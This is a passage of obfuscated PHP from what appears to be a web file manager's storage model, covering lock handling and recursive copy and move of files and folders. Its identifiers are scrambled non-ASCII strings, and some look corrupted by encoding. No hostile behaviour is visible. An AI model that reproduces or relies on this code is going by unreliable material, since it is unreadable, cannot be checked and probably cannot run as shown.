$£°ığ³ü[10] . $øİ¡® ¸; $this->_lockTimeStart[$ùé¯×ëê] = timeFloat(); if (!is_array($§ÉÈæé)) { return; } $²¦½²“ = LNG($£°ığ³ü[634]); CacheLock::setErrorMsg($£°ığ³ü[176] . htmlspecialchars($§ÉÈæé[$£°ığ³ü[32]]) . $£°ığ³ü[178] . $²¦½²“); $this->_lockKey($ùé¯×ëê, 1); $this->_lockKey($ùé¯×ëê, 0); $ë´Øû¦¡ = array_reverse($this->parentLevelArray($§ÉÈæé[$£°ığ³ü[589]])); foreach ($ë´Øû¦¡ as $ûíâ„ú¯) { $ùé¯×ëê = $Ïìáıƒ© . $£°ığ³ü[635] . $ûíâ„ú¯; if (CacheLock::lockGet($£°ığ³ü[636] . $ùé¯×ëê)) { $§ÉÈæé = $this->sourceInfo($ûíâ„ú¯); CacheLock::setErrorMsg($£°ığ³ü[176] . htmlspecialchars($§ÉÈæé[$£°ığ³ü[32]]) . $£°ığ³ü[178] . $²¦½²“); $this->_lockKey($ùé¯×ëê, 1); $this->_lockKey($ùé¯×ëê, 0); } } } private function _lockCheckEnd($­´®¾ğì, $ƒ×³¥«×) { $ä§Á¬• =& $_SERVER[«òÑğ]; $©´ÀÑÁ¼ = $­´®¾ğì . $ä§Á¬•[10] . $ƒ×³¥«×; CacheLock::setErrorMsg($ä§Á¬•[457]); if (!isset($this->_lockTimeStart[$©´ÀÑÁ¼])) { return; } $²¬‡Şà = timeFloat() - $this->_lockTimeStart[$©´ÀÑÁ¼]; unset($this->_lockTimeStart[$©´ÀÑÁ¼]); if ($²¬‡Şà > 0.5) { unset(self::$cacheSourceInfo[$ä§Á¬•[536] . $ƒ×³¥«×]); } $­Ø±ĞÚù = $this->sourceInfo($ƒ×³¥«×); if (!$­Ø±ĞÚù) { show_json(LNG($ä§Á¬•[108]), !1); } } private function _lockParent($¶òÄ¯š, $ß¦ë µ½, $¿Ğı”®¿) { if (!$this->autoLockSet) { return; } $áœ„½”ƒ = $this->sourceInfo($¶òÄ¯š); if (!is_array($áœ„½”ƒ)) { return; } $ÆÚÄ¯úí = array_reverse($this->parentLevelArray($áœ„½”ƒ[$_SERVER[«òÑğ][589]])); foreach ($ÆÚÄ¯úí as $µ‡´­ÉË) { $this->_lockEvent($µ‡´­ÉË, $ß¦ë µ½, $¿Ğı”®¿); } } private function _lockEvent($˜·§º„Ò, $ÛĞÈÚ˜à, $ÇÕ½Ä¨Œ) { $»ô…€İ• =& $_SERVER[«òÑğ]; if (!$this->autoLockSet) { return; } foreach ($ÛĞÈÚ˜à as $Íú„³ìé) { $¥‹¹ıÓ = $Íú„³ìé . $»ô…€İ•[10] . $˜·§º„Ò; if ($ÇÕ½Ä¨Œ && CacheLock::lockGet($»ô…€İ•[636] . $¥‹¹ıÓ)) { continue; } $this->_lockKey($¥‹¹ıÓ, $ÇÕ½Ä¨Œ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($»©º•ı³, $†ÂóæÒ® = 1) { $”µÃÓ¾ = $_SERVER[«òÑğ][636] . md5($»©º•ı³); if ($†ÂóæÒ®) { if (isset(self::$_lockItemArr[$”µÃÓ¾])) { return; } self::$_lockItemArr[$”µÃÓ¾] = 1; CacheLock::lock($”µÃÓ¾, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$”µÃÓ¾])) { return; } unset(self::$_lockItemArr[$”µÃÓ¾]); CacheLock::unlock($”µÃÓ¾); } } public function isParentOf($²“Š½Ì, $»šÁÑè¼) { $ä®¿ÚŞÓ =& $_SERVER[«òÑğ]; $„ƒ¯¸¯® = $this->sourceInfo($²“Š½Ì); $‹õŞ“­ = $this->sourceInfo($»šÁÑè¼); $à–“¬©¾ = $„ƒ¯¸¯®[$ä®¿ÚŞÓ[589]] . $„ƒ¯¸¯®[$ä®¿ÚŞÓ[194]] . $ä®¿ÚŞÓ[50]; $Œøó¬½  = $‹õŞ“­[$ä®¿ÚŞÓ[589]] . $‹õŞ“­[$ä®¿ÚŞÓ[194]] . $ä®¿ÚŞÓ[50]; $·‚Ü«ç = strpos($Œøó¬½ , $à–“¬©¾) === 0; return $·‚Ü«ç; } private $targetIsDelete = 0; public function copy($ÌÜÍÛ¹, $ë…ñ»â°, $Œ€»´Òç = REPEAT_REPLACE, $Ğêˆş¥Ş = '') { $¨—”™Ò¡ =& $_SERVER[«òÑğ]; $Ñ¨¼ùÈç = $this->sourceInfo($ÌÜÍÛ¹); $£œÁ«ÇÚ = $this->sourceInfo($ë…ñ»â°); if (!$Ñ¨¼ùÈç || !$£œÁ«ÇÚ || $£œÁ«ÇÚ[$¨—”™Ò¡[488]] != $¨—”™Ò¡[91]) { return !1; } if ($this->isParentOf($ÌÜÍÛ¹, $ë…ñ»â°)) { return !1; } $êìãõß£ = $Ğêˆş¥Ş ? $Ğêˆş¥Ş : $Ñ¨¼ùÈç[$¨—”™Ò¡[32]]; $this->lockCopyStart($ÌÜÍÛ¹); $this->lockWriteStart($ë…ñ»â°, $êìãõß£); $­×‹Õ† = array($¨—”™Ò¡[637] => array(), $¨—”™Ò¡[638] => array(), $¨—”™Ò¡[639] => array()); $this->targetIsDelete = intval($Ñ¨¼ùÈç[$¨—”™Ò¡[508]]); $²³œË‰Š = $this->fileNameExistAuto($ë…ñ»â°, $Ñ¨¼ùÈç); $¯çæÒ„ı = $this->_copy($ÌÜÍÛ¹, $ë…ñ»â°, $Œ€»´Òç, $­×‹Õ†, !0, $Ğêˆş¥Ş); $this->_childrenListClear(); $this->lockCopyEnd($ÌÜÍÛ¹); $this->lockWriteEnd($ë…ñ»â°, $êìãõß£); if ($Ñ¨¼ùÈç[$¨—”™Ò¡[488]] == $¨—”™Ò¡[91] && $²³œË‰Š == $¯çæÒ„ı) { $this->folderSizeResetChildren($²³œË‰Š); } Model($¨—”™Ò¡[640])->addAll($­×‹Õ†[$¨—”™Ò¡[638]], array(), !0); if ($²³œË‰Š != $¯çæÒ„ı || $Ñ¨¼ùÈç[$¨—”™Ò¡[488]] == $¨—”™Ò¡[91]) { Model($¨—”™Ò¡[641])->eventCopy($¯çæÒ„ı); } $this->saveAll($­×‹Õ†[$¨—”™Ò¡[639]]); Model($¨—”™Ò¡[233])->linkAdd($­×‹Õ†[$¨—”™Ò¡[637]]); $this->folderSizeReset($ë…ñ»â°); $this->updateModifyTime($ë…ñ»â°); return $¯çæÒ„ı; } private function _copy($èš·ËËĞ, $åÎª®ñĞ, $¶¶ÆğËÆ, &$‡²Ñ¨èä, $–ƒ›íÌ—, $«¯ú ê = '') { $³Ñ¨ÙÀŒ =& $_SERVER[«òÑğ]; $Ø”’öÍá = $this->sourceInfoCache($èš·ËËĞ); $µ™Èºè… = $Ø”’öÍá[$³Ñ¨ÙÀŒ[488]] == $³Ñ¨ÙÀŒ[91]; $ØìöÏ»Ã = $«¯ú ê ? $«¯ú ê : $Ø”’öÍá[$³Ñ¨ÙÀŒ[32]]; $¤­Œã° = $this->fileNameExistAuto($åÎª®ñĞ, $Ø”’öÍá); if ($–ƒ›íÌ—) { $this->_childrenAllMake($èš·ËËĞ); if ($µ™Èºè… && $¤­Œã°) { $this->_childrenAllMake($¤­Œã°); } } if (!$¤­Œã°) { return $this->_copyCreate($èš·ËËĞ, $åÎª®ñĞ, $ØìöÏ»Ã, $‡²Ñ¨èä); } $È‡Ã« = $¤­Œã°; if ($µ™Èºè…) { if ($¶¶ÆğËÆ == REPEAT_RENAME_FOLDER) { $ØìöÏ»Ã = $this->fileNameAutoCache($åÎª®ñĞ, $ØìöÏ»Ã, $¶¶ÆğËÆ, $µ™Èºè…); $È‡Ã« = $this->_copyCreate($èš·ËËĞ, $åÎª®ñĞ, $ØìöÏ»Ã, $‡²Ñ¨èä); } else { $ŸÁ•™É = $this->_childrenList($èš·ËËĞ); foreach ($ŸÁ•™É as $ÇÖ…®Œø) { $this->_copy($ÇÖ…®Œø[$³Ñ¨ÙÀŒ[194]], $¤­Œã°, $¶¶ÆğËÆ, $‡²Ñ¨èä, !1); } } } else { if ($¶¶ÆğËÆ == REPEAT_RENAME || $¶¶ÆğËÆ == REPEAT_RENAME_FOLDER) { $ØìöÏ»Ã = $this->fileNameAutoCache($åÎª®ñĞ, $ØìöÏ»Ã, $¶¶ÆğËÆ, $µ™Èºè…); $È‡Ã« = $this->_copyCreate($èš·ËËĞ, $åÎª®ñĞ, $ØìöÏ»Ã, $‡²Ñ¨èä); } else { if ($¶¶ÆğËÆ == REPEAT_REPLACE) { $¶­Ï§Ûœ = $this->sourceInfoCache($¤­Œã°); $øİõ˜îÌ = $this->fileHistory($¶­Ï§Ûœ, $Ø”’öÍá[$³Ñ¨ÙÀŒ[546]], $Ø”’öÍá[$³Ñ¨ÙÀŒ[79]]); if ($øİõ˜îÌ) { $‡²Ñ¨èä[$³Ñ¨ÙÀŒ[637]][] = $Ø”’öÍá[$³Ñ¨ÙÀŒ[546]]; } } else { if ($¶¶ÆğËÆ == REPEAT_SKIP) { } } } Hook::trigger($³Ñ¨ÙÀŒ[642], array($³Ñ¨ÙÀŒ[643], $Ø”’öÍá, 0)); } return $È‡Ã«; } private function _copyCreate($ÃŸ”“ÕÉ, $°­¨å©, $ùüÂÛïÅ, &$ë×®¹šà) { $¥Ù¢ö¡â =& $_SERVER[«òÑğ]; $¤åùñáÔ = $this->sourceInfoCache($ÃŸ”“ÕÉ); $Şæ£ˆÔæ = $this->sourceInfoCache($°­¨å©); $ªŞ¡ßÈ› = $this->_makeItemData($¤åùñáÔ, $Şæ£ˆÔæ, $ùüÂÛïÅ); Hook::trigger($¥Ù¢ö¡â[644], $ªŞ¡ßÈ›); Hook::trigger($¥Ù¢ö¡â[645], array($¥Ù¢ö¡â[646], $ªŞ¡ßÈ›, 0)); $Å¯³¾ º = $this->add($ªŞ¡ßÈ›); $¯Ì’ª¤ø = array($¥Ù¢ö¡â[194] => $Å¯³¾ º, $¥Ù¢ö¡â[32] => $ùüÂÛïÅ); $this->_copyApplyMeta($¯Ì’ª¤ø, $ë×®¹šà); if ($¤åùñáÔ[$¥Ù¢ö¡â[488]] != $¥Ù¢ö¡â[91]) { $ë×®¹šà[$¥Ù¢ö¡â[637]][] = $¤åùñáÔ[$¥Ù¢ö¡â[546]]; return $Å¯³¾ º; } $ñ°óæÎƒ = array(); $÷ª÷¥âì = array(); $this->_childrenListAll($ÃŸ”“ÕÉ, $ñ°óæÎƒ); $ÖŠêËÉ = count($ñ°óæÎƒ); if ($ÖŠêËÉ == 0) { return $Å¯³¾ º; } $»ÖôÊ»ˆ = $this->sourceInfo($Å¯³¾ º); foreach ($ñ°óæÎƒ as $ˆ²£¬²­) { $Ï—åªˆ³ = $this->_makeItemData($ˆ²£¬²­, $»ÖôÊ»ˆ, $ˆ²£¬²­[$¥Ù¢ö¡â[32]]); $Ï—åªˆ³[$¥Ù¢ö¡â[589]] = $ˆ²£¬²­[$¥Ù¢ö¡â[589]]; $÷ª÷¥âì[] = $Ï—åªˆ³; } $this->chunkEventSet($¥Ù¢ö¡â[647], array($¥Ù¢ö¡â[648], $ªŞ¡ßÈ›, $ÖŠêËÉ)); $this->addAll($÷ª÷¥âì, array(), !1); $‚ÛÜæ’á = $this->where(array($¥Ù¢ö¡â[193] => $Å¯³¾ º))->select(); $ÔĞÙäş½ = $this->_childrenMakeRelation($ñ°óæÎƒ, $‚ÛÜæ’á); $ÔĞÙäş½[$ÃŸ”“ÕÉ] = $Å¯³¾ º; $¼ÂºÛ®» = array(); $…ëô«„² = array(); foreach ($‚ÛÜæ’á as $ˆ²£¬²­) { $œƒÜëÔ = $ˆ²£¬²­[$¥Ù¢ö¡â[194]]; $­¨®¨» = $this->_childrenMatch($ÔĞÙäş½, $ˆ²£¬²­, $»ÖôÊ»ˆ); $¼ÂºÛ®»[] = array($¥Ù¢ö¡â[194], $œƒÜëÔ, $¥Ù¢ö¡â[193], $­¨®¨»[$¥Ù¢ö¡â[193]]); $…ëô«„²[] = array($¥Ù¢ö¡â[194], $œƒÜëÔ, $¥Ù¢ö¡â[589], $­¨®¨»[$¥Ù¢ö¡â[589]]); $this->_copyApplyMeta($ˆ²£¬²­, $ë×®¹šà); if ($ˆ²£¬²­[$¥Ù¢ö¡â[488]] != $¥Ù¢ö¡â[91]) { $ë×®¹šà[$¥Ù¢ö¡â[637]][] = $ˆ²£¬²­[$¥Ù¢ö¡â[546]]; } } $this->chunkEventSet($¥Ù¢ö¡â[649], array($¥Ù¢ö¡â[650], $ªŞ¡ßÈ›, $ÖŠêËÉ)); $this->saveAll($¼ÂºÛ®»); $this->chunkEventSet($¥Ù¢ö¡â[651], array($¥Ù¢ö¡â[652], $ªŞ¡ßÈ›, $ÖŠêËÉ)); $this->saveAll($…ëô«„²); return $Å¯³¾ º; } private function _childrenMakeRelation($€×ïúêƒ, $×É¾¦ÛÁ) { $×ÎÒŒ«Ì =& $_SERVER[«òÑğ]; $ĞŒÀ©ƒë = array(); $†¡÷ÎÆ = array(); foreach ($€×ïúêƒ as $‚ì€ë¸) { $±ìß°© = $‚ì€ë¸[$×ÎÒŒ«Ì[32]] . $×ÎÒŒ«Ì[8] . $‚ì€ë¸[$×ÎÒŒ«Ì[589]]; $ĞŒÀ©ƒë[$±ìß°©] = $‚ì€ë¸[$×ÎÒŒ«Ì[194]]; } foreach ($×É¾¦ÛÁ as $‚ì€ë¸) { $±ìß°© = $‚ì€ë¸[$×ÎÒŒ«Ì[32]] . $×ÎÒŒ«Ì[8] . $‚ì€ë¸[$×ÎÒŒ«Ì[589]]; $¸êÏş¡± = $ĞŒÀ©ƒë[$±ìß°©]; $†¡÷ÎÆ[$¸êÏş¡±] = $‚ì€ë¸[$×ÎÒŒ«Ì[194]]; } return $†¡÷ÎÆ; } private function _childrenMatch($¼şèâÙë, $é‚Õ¯’‘, $ıéµàª») { $™™®ï²Š =& $_SERVER[«òÑğ]; $ËÆÃÇßÛ = $ıéµàª»[$™™®ï²Š[589]]; $¨†¥Èé = $this->parentLevelArray($é‚Õ¯’‘[$™™®ï²Š[589]]); foreach ($¨†¥Èé as $’¸ÖÒÄ¦) { if (isset($¼şèâÙë[$’¸ÖÒÄ¦])) { $ËÆÃÇßÛ .= $¼şèâÙë[$’¸ÖÒÄ¦] . $™™®ï²Š[653]; } } $ËÆÃÇßÛ = rtrim($ËÆÃÇßÛ, $™™®ï²Š[50]) . $™™®ï²Š[50]; $ôÕÜÂë¨ = $this->parentLevelArray($ËÆÃÇßÛ); $ÚÜÁ¶ÏÍ = $ôÕÜÂë¨[count($ôÕÜÂë¨) - 1]; return array($™™®ï²Š[193] => $ÚÜÁ¶ÏÍ, $™™®ï²Š[589] => $ËÆÃÇßÛ); } private function _makeItemData($ßÔßŞ©·, $¡˜ïä…, $ É™é«š) { $§’ß´“Œ =& $_SERVER[«òÑğ]; $Ø¿È³·Œ = array($§’ß´“Œ[654] => $ßÔßŞ©·[$§’ß´“Œ[488]], $§’ß´“Œ[497] => $ É™é«š, $§’ß´“Œ[655] => $ßÔßŞ©·[$§’ß´“Œ[489]] ? $ßÔßŞ©·[$§’ß´“Œ[489]] : $§’ß´“Œ[12], $§’ß´“Œ[547] => $ßÔßŞ©·[$§’ß´“Œ[546]] ? $ßÔßŞ©·[$§’ß´“Œ[546]] : 0, $§’ß´“Œ[625] => $ßÔßŞ©·[$§’ß´“Œ[79]] ? $ßÔßŞ©·[$§’ß´“Œ[79]] : 0, $§’ß´“Œ[656] => intval($¡˜ïä…[$§’ß´“Œ[191]]), $§’ß´“Œ[657] => intval($¡˜ïä…[$§’ß´“Œ[574]]), $§’ß´“Œ[658] => intval(USER_ID), $§’ß´“Œ[659] => intval(USER_ID), $§’ß´“Œ[480] => intval($¡˜ïä…[$§’ß´“Œ[194]]), $§’ß´“Œ[660] => $¡˜ïä…[$§’ß´“Œ[589]] . $¡˜ïä…[$§’ß´“Œ[194]] . $§’ß´“Œ[50], $§’ß´“Œ[501] => $ßÔßŞ©·[$§’ß´“Œ[88]] ? $ßÔßŞ©·[$§’ß´“Œ[88]] : time(), $§’ß´“Œ[507] => 0, $§’ß´“Œ[661] => $§’ß´“Œ[12]); return $Ø¿È³·Œ; } private function _copyApplyMeta($€×¼×ô½, &$’…éŸªŞ) { $°À®çúÍ =& $_SERVER[«òÑğ]; $öûôÉ¶‹ = $€×¼×ô½[$°À®çúÍ[194]]; $©õÀĞì“ = $€×¼×ô½[$°À®çúÍ[32]]; if (!isset($€×¼×ô½[$°À®çúÍ[662]]) || !$€×¼×ô½[$°À®çúÍ[662]] || $€×¼×ô½[$°À®çúÍ[662]] == $°À®çúÍ[231]) { $’…éŸªŞ[$°À®çúÍ[639]][] = array($°À®çúÍ[194], $öûôÉ¶‹, $°À®çúÍ[662], short_id($öûôÉ¶‹)); } if (Input::check($©õÀĞì“, $°À®çúÍ[663])) { $’…éŸªŞ[$°À®çúÍ[638]][] = array($°À®çúÍ[194] => $öûôÉ¶‹, $°À®çúÍ[97] => $°À®çúÍ[541], $°À®çúÍ[453] => str_replace($°À®çúÍ[53], $°À®çúÍ[12], Pinyin::get($©õÀĞì“))); $’…éŸªŞ[$°À®çúÍ[638]][] = array($°À®çúÍ[194] => $öûôÉ¶‹, $°À®çúÍ[97] => $°À®çúÍ[540], $°À®çúÍ[453] => Pinyin::get($©õÀĞì“, $°À®çúÍ[664])); } $’…éŸªŞ[$°À®çúÍ[638]][] = array($°À®çúÍ[194] => $öûôÉ¶‹, $°À®çúÍ[97] => $°À®çúÍ[520], $°À®çúÍ[453] => KodSort::makeStr($©õÀĞì“)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($±È¡éÇ) { $­§±±öã =& $_SERVER[«òÑğ]; $êë»ÁıÊ = $this->sourceInfo($±È¡éÇ); $·»á‹ÈÈ = $­§±±öã[665]; $¼™€ëàÔ = array($­§±±öã[589] => array($­§±±öã[620], $êë»ÁıÊ[$­§±±öã[589]] . $±È¡éÇ . $­§±±öã[621]), $­§±±öã[508] => $this->targetIsDelete); $Ğ¯õæÂ = $this->field($·»á‹ÈÈ)->where($¼™€ëàÔ)->select(); if (!$Ğ¯õæÂ) { return; } $Ğ¯õæÂ = array_to_keyvalue($Ğ¯õæÂ, $­§±±öã[194]); foreach ($Ğ¯õæÂ as $úïø™ƒ) { $Â«ˆµ˜ = $úïø™ƒ[$­§±±öã[193]]; $±È¡éÇ = $úïø™ƒ[$­§±±öã[194]]; if (!isset($this->_childrenListCache[$±È¡éÇ]) && $úïø™ƒ[$­§±±öã[488]] == $­§±±öã[91]) { $this->_childrenListCache[$±È¡éÇ] = array(); } if (!isset($this->_childrenListCache[$Â«ˆµ˜])) { $this->_childrenListCache[$Â«ˆµ˜] = array(); } $this->_childrenListCache[$Â«ˆµ˜][$±È¡éÇ] = $úïø™ƒ; $this->_childrenItemCache[$±È¡éÇ] = $úïø™ƒ; } } private function _childrenListAll($ÂŞ‡¶ØŒ, &$–ëŞŸÅÇ) { $ş½ƒÁ‹¼ =& $_SERVER[«òÑğ]; if (!isset($this->_childrenListCache[$ÂŞ‡¶ØŒ])) { return; } $ó¥¼÷š = $this->_childrenListCache[$ÂŞ‡¶ØŒ]; foreach ($ó¥¼÷š as $ÙÓ¡ÜĞ® => $İ‹¦À€Ù) { $–ëŞŸÅÇ[$ÙÓ¡ÜĞ®] = $İ‹¦À€Ù; if ($İ‹¦À€Ù[$ş½ƒÁ‹¼[488]] == $ş½ƒÁ‹¼[91]) { $this->_childrenListAll($ÙÓ¡ÜĞ®, $–ëŞŸÅÇ); } } } private function sourceInfoCache($Ô¹ß«¦ş) { if (isset($this->_childrenItemCache[$Ô¹ß«¦ş])) { return $this->_childrenItemCache[$Ô¹ß«¦ş]; } return $this->sourceInfo($Ô¹ß«¦ş); } private function _childrenList($¾ºİˆ‰Û) { if (isset($this->_childrenListCache[$¾ºİˆ‰Û])) { return $this->_childrenListCache[$¾ºİˆ‰Û]; } return $this->_childrenListSelect($¾ºİˆ‰Û); } private function _childrenListSelect($ß¾ÉŒËÚ) { $‹È‚·Šî =& $_SERVER[«òÑğ]; $ÚÌÂ×¶ = array($‹È‚·Šî[193] => $ß¾ÉŒËÚ, $‹È‚·Šî[508] => $this->targetIsDelete); $æ´îÎ = $this->where($ÚÌÂ×¶)->select(); $æ´îÎ = $æ´îÎ ? $æ´îÎ : array(); $ñçíÏÌ¬ = array_to_keyvalue($æ´îÎ, $‹È‚·Šî[194]); $this->_childrenListCache[$ß¾ÉŒËÚ] = $ñçíÏÌ¬; foreach ($ñçíÏÌ¬ as $ß¾ÉŒËÚ => $†æ“•òá) { $this->_childrenItemCache[$ß¾ÉŒËÚ] = $†æ“•òá; } return $ñçíÏÌ¬; } private function fileNameExistAuto($úí­õ£Ã, $·–Êş†) { $”’¾àÆİ =& $_SERVER[«òÑğ]; if ($·–Êş†[$”’¾àÆİ[508]] == $”’¾àÆİ[91]) { return $this->fileNameExist($úí­õ£Ã, $·–Êş†[$”’¾àÆİ[32]]); } return $this->fileNameExistCache($úí­õ£Ã, $·–Êş†[$”’¾àÆİ[32]]); } private function fileNameExistCache($Ş‹ùå†, $ÍåŸ¥ˆ­) { $ŸäÕ´¯ñ =& $_SERVER[«òÑğ]; $ÍåŸ¥ˆ­ = strtolower($ÍåŸ¥ˆ­); $ªç¹íºï = $this->_childrenList($Ş‹ùå†); foreach ($ªç¹íºï as $‡Ü„æ¶ç) { if ($ÍåŸ¥ˆ­ == strtolower($‡Ü„æ¶ç[$ŸäÕ´¯ñ[32]])) { return $‡Ü„æ¶ç[$ŸäÕ´¯ñ[194]]; } } return !1; } private function fileNameAutoCache($³Ùå€¡, $›çñ´¯á, $üÆÌä·•, $øŒÖıøÌ) { $ÉÕ½ÊŸâ =& $_SERVER[«òÑğ]; $€¡äÉÖÔ = $this->_childrenList($³Ùå€¡); $Îî úÎ· = array_to_keyvalue($€¡äÉÖÔ, $ÉÕ½ÊŸâ[12], $ÉÕ½ÊŸâ[32]); return $this->fileNameAutoGet($Îî úÎ·, $›çñ´¯á, $üÆÌä·•, $øŒÖıøÌ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¼’šçÂ¸, $³ÎÆü™Á, $œ¶±§ÕÆ = REPEAT_REPLACE, $õş¯¶´Ô = '') { $¸°š¦š =& $_SERVER[«òÑğ]; $âÒ·êºò = $this->sourceInfo($¼’šçÂ¸); $»’‰˜¥ = $this->sourceInfo($³ÎÆü™Á); if ($âÒ·êºò[$¸°š¦š[193]] == $»’‰˜¥[$¸°š¦š[194]]) { if ($âÒ·êºò[$¸°š¦š[508]] == $¸°š¦š[91]) { Model($¸°š¦š[506])->restore(array($¼’šçÂ¸)); } if (!$õş¯¶´Ô || $õş¯¶´Ô == $âÒ·êºò[$¸°š¦š[32]]) { return $¼’šçÂ¸; } } $“Î†¿à = $this->pathInfoMore($¼’šçÂ¸); if ($this->isParentOf($¼’šçÂ¸, $³ÎÆü™Á)) { return !1; } if (!$âÒ·êºò || !$»’‰˜¥ || $»’‰˜¥[$¸°š¦š[488]] != $¸°š¦š[91]) { return !1; } Hook::trigger($¸°š¦š[666], $“Î†¿à); $this->targetIsDelete = intval($âÒ·êºò[$¸°š¦š[508]]); if ($âÒ·êºò[$¸°š¦š[193]] == $³ÎÆü™Á && $õş¯¶´Ô != $âÒ·êºò[$¸°š¦š[32]]) { $–ßÉ¥›ì = $this->fileNameExist($³ÎÆü™Á, $õş¯¶´Ô); if ($–ßÉ¥›ì && $âÒ·êºò[$¸°š¦š[488]] == $¸°š¦š[231]) { $–ªÔÖ†ˆ = $this->sourceInfo($–ßÉ¥›ì); $³›ŸíÃİ = $this->fileHistory($–ªÔÖ†ˆ, $âÒ·êºò[$¸°š¦š[546]], $âÒ·êºò[$¸°š¦š[79]]); if (!$³›ŸíÃİ) { Model($¸°š¦š[549])->remove($âÒ·êºò[$¸°š¦š[546]]); } $this->removeNow($¼’šçÂ¸, !1); $this->folderSizeReset($³ÎÆü™Á); Hook::trigger($¸°š¦š[667], $“Î†¿à); return $–ßÉ¥›ì; } } $ÖŸšªÈ = $õş¯¶´Ô ? $õş¯¶´Ô : $âÒ·êºò[$¸°š¦š[32]]; $this->lockMoveStart($¼’šçÂ¸); $this->lockWriteStart($³ÎÆü™Á, $ÖŸšªÈ); $ûï«‚ÏÔ = array($¸°š¦š[637] => array(), $¸°š¦š[668] => !1); $this->clearShare($¼’šçÂ¸, $³ÎÆü™Á); $Ú¬¼€’ß = $this->fileNameExistAuto($³ÎÆü™Á, $âÒ·êºò); $Ø²×Ë¹ = $this->_move($¼’šçÂ¸, $³ÎÆü™Á, $œ¶±§ÕÆ, $ûï«‚ÏÔ, $õş¯¶´Ô); $this->sourceCacheClear(); if ($âÒ·êºò[$¸°š¦š[488]] == $¸°š¦š[91] && $Ú¬¼€’ß) { $this->folderSizeResetChildren($Ø²×Ë¹); } Model($¸°š¦š[233])->linkAdd($ûï«‚ÏÔ[$¸°š¦š[637]]); if ($Ø²×Ë¹ && $Ú¬¼€’ß && $ûï«‚ÏÔ[$¸°š¦š[668]]) { $º€¥„ÛÉ = $âÒ·êºò[$¸°š¦š[488]] == $¸°š¦š[91] ? $this->_childrenListSelect($¼’šçÂ¸) : !1; $«øóúÏğ = $º€¥„ÛÉ && count($º€¥„ÛÉ) > 0 ? !0 : !1; $this->removeNow($¼’šçÂ¸, $«øóúÏğ); } $this->lockMoveEnd($¼’šçÂ¸); $this->lockWriteEnd($³ÎÆü™Á, $ÖŸšªÈ); $this->folderSizeReset($âÒ·êºò[$¸°š¦š[193]]); $this->folderSizeReset($³ÎÆü™Á); $›Şµ•àÌ = array($âÒ·êºò[$¸°š¦š[193]], $³ÎÆü™Á); if ($âÒ·êºò[$¸°š¦š[488]] == $¸°š¦š[91]) { $›Şµ•àÌ[] = $¼’šçÂ¸; } $this->updateModifyTime($›Şµ•àÌ); Model($¸°š¦š[641])->eventMove($¼’šçÂ¸, $âÒ·êºò[$¸°š¦š[193]], $³ÎÆü™Á); Hook::trigger($¸°š¦š[667], $“Î†¿à); return $Ø²×Ë¹; } private function _move($Û÷­ÒÎ, $‡ÒÉ“äı, $°ÚùÀ›…, &$Ö­—î²ò, $…ò€†ØÎ = '') { $¨ÂÁ²±Î =& $_SERVER[«òÑğ]; $ü¶áæüæ = $this->sourceInfo($Û÷­ÒÎ); $’úı¼” = $ü¶áæüæ[$¨ÂÁ²±Î[488]] == $¨ÂÁ²±Î[91]; $°«¡èõ‚ = $…ò€†ØÎ ? $…ò€†ØÎ : $ü¶áæüæ[$¨ÂÁ²±Î[32]]; $êåØ•ìˆ = $this->fileNameExistAuto($‡ÒÉ“äı, $ü¶áæüæ); $this->lockMoveStart($Û÷­ÒÎ); $this->lockWriteStart($‡ÒÉ“äı, $°«¡èõ‚); if (!$êåØ•ìˆ) { return $this->_moveForce($Û÷­ÒÎ, $‡ÒÉ“äı, $°«¡èõ‚); } $¦¸Ä¶¯ = $êåØ•ìˆ; $Ÿø’“ = !1; if ($’úı¼”) { if ($°ÚùÀ›… == REPEAT_RENAME_FOLDER) { $°«¡èõ‚ = $this->fileNameAuto($‡ÒÉ“äı, $°«¡èõ‚, $°ÚùÀ›…, $’úı¼”); $¦¸Ä¶¯ = $this->_moveForce($Û÷­ÒÎ, $‡ÒÉ“äı, $°«¡èõ‚); } else { $ÚÖŠÓÑÔ = $this->_childrenListSelect($Û÷­ÒÎ); foreach ($ÚÖŠÓÑÔ as $¶½İÛºõ) { $ßğÖÚ– = REPEAT_REPLACE; $this->_move($¶½İÛºõ[$¨ÂÁ²±Î[194]], $êåØ•ìˆ, $ßğÖÚ–, $Ö­—î²ò); } $Ÿø’“ = !0; } } else { if ($°ÚùÀ›… == REPEAT_RENAME || $°ÚùÀ›… == REPEAT_RENAME_FOLDER) { $°«¡èõ‚ = $this->fileNameAuto($‡ÒÉ“äı, $°«¡èõ‚, $°ÚùÀ›…, $’úı¼”); $¦¸Ä¶¯ = $this->_moveForce($Û÷­ÒÎ, $‡ÒÉ“äı, $°«¡èõ‚); } else { $ËšØú = $this->sourceInfoCache($êåØ•ìˆ); $œªÓ™Éó = $this->fileHistory($ËšØú, $ü¶áæüæ[$¨ÂÁ²±Î[546]], $ü¶áæüæ[$¨ÂÁ²±Î[79]]); if ($œªÓ™Éó) { $Ö­—î²ò[$¨ÂÁ²±Î[637]][] = $ü¶áæüæ[$¨ÂÁ²±Î[546]]; } $Ÿø’“ = !0; } } if ($Ÿø’“) { $Ö­—î²ò[$¨ÂÁ²±Î[668]] = !0; } return $¦¸Ä¶¯; } private function _moveForce($šì°Œ¹î, $°øü˜³™, $éæçºÙ) { $È•¨íàœ =& $_SERVER[«òÑğ]; $ë¸½œñË = $this->sourceInfo($šì°Œ¹î); $šÚ¶ñ­ = $this->sourceInfo($°øü˜³™); $˜Ø¾ïâ˜ = $ë¸½œñË[$È•¨íàœ[488]] == $È•¨íàœ[91]; $é—Ñß¿Ó = array($È•¨íàœ[480] => $šÚ¶ñ­[$È•¨íàœ[194]], $È•¨íàœ[660] => $šÚ¶ñ­[$È•¨íàœ[589]] . $šÚ¶ñ­[$È•¨íàœ[194]] . $È•¨íàœ[50], $È•¨íàœ[656] => $šÚ¶ñ­[$È•¨íàœ[191]], $È•¨íàœ[657] => $šÚ¶ñ­[$È•¨íàœ[574]], $È•¨íàœ[659] => USER_ID, $È•¨íàœ[497] => $éæçºÙ); $ë°€ˆ±ğ = $ë¸½œñË[$È•¨íàœ[191]] == SourceModel::TYPE_GROUP && $šÚ¶ñ­[$È•¨íàœ[191]] == SourceModel::TYPE_GROUP && $ë¸½œñË[$È•¨íàœ[574]] 